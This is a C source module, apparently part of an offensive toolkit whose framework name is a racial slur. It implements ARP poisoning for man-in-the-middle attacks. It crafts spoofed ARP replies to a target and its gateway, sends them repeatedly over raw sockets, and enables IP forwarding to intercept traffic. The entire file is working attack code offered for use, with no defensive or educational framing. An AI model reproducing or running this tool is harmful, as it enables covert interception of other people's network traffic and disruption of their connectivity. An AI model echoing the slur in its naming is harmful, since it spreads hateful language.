/*
 * ═══════════════════════════════════════════════════════════════════════
 *  REAPER MODULE - NIGGERSON FRAMEWORK
 *  MITM / ARP Poisoning for Linux
 *  Uses raw sockets - no libpcap required!
 * ═══════════════════════════════════════════════════════════════════════
 */

// Headers included via main.c (unity build)

// ─── GLOBAL STATE ───────────────────────────────────────────────────────
static volatile int reaper_running = 0;
static pthread_t reaper_thread;
static int reaper_sock = -1;

typedef struct {
    char target_ip[32];
    char gateway_ip[32];
    char interface[32];
    unsigned char our_mac[6];
} reaper_config_t;

// ─── GET INTERFACE INDEX ────────────────────────────────────────────────
static int get_ifindex(const char* iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
        close(fd);
        return -1;
    }
    
    close(fd);
    return ifr.ifr_ifindex;
}

// ─── BUILD ARP PACKET ───────────────────────────────────────────────────
static void build_arp_packet(unsigned char* packet,
                             unsigned char* src_mac,
                             const char* src_ip,
                             unsigned char* dst_mac,
                             const char* dst_ip,
                             int is_reply) {
    // Ethernet header (14 bytes)
    struct ether_header* eth = (struct ether_header*)packet;
    memcpy(eth->ether_dhost, dst_mac, 6);
    memcpy(eth->ether_shost, src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);
    
    // ARP header
    struct ether_arp* arp = (struct ether_arp*)(packet + sizeof(struct ether_header));
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp->ea_hdr.ar_hln = 6;  // MAC length
    arp->ea_hdr.ar_pln = 4;  // IP length
    arp->ea_hdr.ar_op = htons(is_reply ? ARPOP_REPLY : ARPOP_REQUEST);
    
    memcpy(arp->arp_sha, src_mac, 6);
    inet_pton(AF_INET, src_ip, arp->arp_spa);
    memcpy(arp->arp_tha, dst_mac, 6);
    inet_pton(AF_INET, dst_ip, arp->arp_tpa);
}

// ─── ARP POISON THREAD ──────────────────────────────────────────────────
static void* reaper_poison_thread(void* arg) {
    reaper_config_t* config = (reaper_config_t*)arg;
    
    int ifindex = get_ifindex(config->interface);
    if (ifindex < 0) {
        printf(COLOR_RED "[!] Failed to get interface index!" COLOR_RESET "\n");
        free(config);
        reaper_running = 0;
        return NULL;
    }
    
    // Create raw socket for ARP
    reaper_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (reaper_sock < 0) {
        printf(COLOR_RED "[!] Failed to create raw socket. Run as root!" COLOR_RESET "\n");
        free(config);
        reaper_running = 0;
        return NULL;
    }
    
    // Broadcast MAC for ARP requests
    unsigned char broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    // Build poison packets
    unsigned char pkt_to_target[64];
    unsigned char pkt_to_gateway[64];
    
    // Tell target: gateway is at our MAC (we spoof the gateway)
    build_arp_packet(pkt_to_target, config->our_mac, config->gateway_ip,
                     broadcast, config->target_ip, 0);
    
    // Tell gateway: target is at our MAC (we spoof the target)
    build_arp_packet(pkt_to_gateway, config->our_mac, config->target_ip,
                     broadcast, config->gateway_ip, 0);
    
    // Socket address for sending
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifindex;
    sa.sll_halen = 6;
    memcpy(sa.sll_addr, broadcast, 6);
    
    printf("\n");
    printf(COLOR_RED COLOR_BOLD);
    printf("╔══════════════════════════════════════╗\n");
    printf("║   ⚠  ARP POISONING ACTIVE  ⚠        ║\n");
    printf("║   Target will lose connectivity!     ║\n");
    printf("║   Type 'reaper stop' to end          ║\n");
    printf("╚══════════════════════════════════════╝\n");
    printf(COLOR_RESET "\n");
    
    int packets = 0;
    
    while (reaper_running) {
        // Send poisoned ARP to target
        sendto(reaper_sock, pkt_to_target, 42, 0, 
               (struct sockaddr*)&sa, sizeof(sa));
        
        // Send poisoned ARP to gateway
        sendto(reaper_sock, pkt_to_gateway, 42, 0,
               (struct sockaddr*)&sa, sizeof(sa));
        
        packets += 2;
        
        // Status update every 10 packets
        if (packets % 20 == 0) {
            printf("\r" COLOR_YELLOW "[*] Packets sent: %d" COLOR_RESET "        ", packets);
            fflush(stdout);
        }
        
        usleep(500000); // 500ms between bursts
    }
    
    printf("\n" COLOR_GREEN "[*] Poison attack stopped. Sent %d packets." COLOR_RESET "\n\n", packets);
    
    if (reaper_sock >= 0) {
        close(reaper_sock);
        reaper_sock = -1;
    }
    
    free(config);
    return NULL;
}

// ─── START ARP POISON ───────────────────────────────────────────────────
void reaper_poison(const char* target_ip, const char* gateway_ip) {
    printf("\n");
    printf(COLOR_CYAN "╔══════════════════════════════════════╗\n");
    printf("║      REAPER - ARP POISON             ║\n");
    printf("╚══════════════════════════════════════╝" COLOR_RESET "\n\n");
    
    if (reaper_running) {
        printf(COLOR_YELLOW "[!] Reaper already running. Use 'reaper stop' first." COLOR_RESET "\n\n");
        return;
    }
    
    if (!target_ip || !gateway_ip || strlen(target_ip) == 0 || strlen(gateway_ip) == 0) {
        printf(COLOR_RED "[!] Usage: reaper poison <target_ip> <gateway_ip>" COLOR_RESET "\n\n");
        return;
    }
    
    // Validate IPs
    struct in_addr tmp;
    if (inet_pton(AF_INET, target_ip, &tmp) != 1) {
        printf(COLOR_RED "[!] Invalid target IP: %s" COLOR_RESET "\n\n", target_ip);
        return;
    }
    if (inet_pton(AF_INET, gateway_ip, &tmp) != 1) {
        printf(COLOR_RED "[!] Invalid gateway IP: %s" COLOR_RESET "\n\n", gateway_ip);
        return;
    }
    
    // Get interface and MAC
    char iface[32];
    get_default_interface(iface, sizeof(iface));
    
    unsigned char our_mac[6];
    if (!get_mac_address(iface, our_mac)) {
        printf(COLOR_RED "[!] Failed to get MAC address!" COLOR_RESET "\n\n");
        return;
    }
    
    printf(COLOR_YELLOW "[*] Target:    %s" COLOR_RESET "\n", target_ip);
    printf(COLOR_YELLOW "[*] Gateway:   %s" COLOR_RESET "\n", gateway_ip);
    printf(COLOR_YELLOW "[*] Interface: %s" COLOR_RESET "\n", iface);
    printf(COLOR_YELLOW "[*] Our MAC:   %02x:%02x:%02x:%02x:%02x:%02x" COLOR_RESET "\n",
           our_mac[0], our_mac[1], our_mac[2],
           our_mac[3], our_mac[4], our_mac[5]);
    
    // Enable IP forwarding (for true MITM, not just DoS)
    if (enable_ip_forward()) {
        printf(COLOR_GREEN "[+] IP forwarding enabled" COLOR_RESET "\n");
    }
    
    // Prepare config for thread
    reaper_config_t* config = malloc(sizeof(reaper_config_t));
    strncpy(config->target_ip, target_ip, sizeof(config->target_ip));
    strncpy(config->gateway_ip, gateway_ip, sizeof(config->gateway_ip));
    strncpy(config->interface, iface, sizeof(config->interface));
    memcpy(config->our_mac, our_mac, 6);
    
    // Start poison thread
    reaper_running = 1;
    if (pthread_create(&reaper_thread, NULL, reaper_poison_thread, config) != 0) {
        printf(COLOR_RED "[!] Failed to start reaper thread!" COLOR_RESET "\n\n");
        reaper_running = 0;
        free(config);
        return;
    }
    
    pthread_detach(reaper_thread);
}

// ─── STOP REAPER ────────────────────────────────────────────────────────
void reaper_stop(void) {
    if (!reaper_running) {
        printf(COLOR_YELLOW "[*] Reaper is not running." COLOR_RESET "\n\n");
        return;
    }
    
    printf(COLOR_YELLOW "[*] Stopping reaper..." COLOR_RESET "\n");
    reaper_running = 0;
    
    // Close socket to unblock any pending operations
    if (reaper_sock >= 0) {
        close(reaper_sock);
        reaper_sock = -1;
    }
    
    // Disable IP forwarding
    disable_ip_forward();
    
    usleep(100000); // Give thread time to clean up
}

// ─── CHECK STATUS ───────────────────────────────────────────────────────
int reaper_is_running(void) {
    return reaper_running;
}
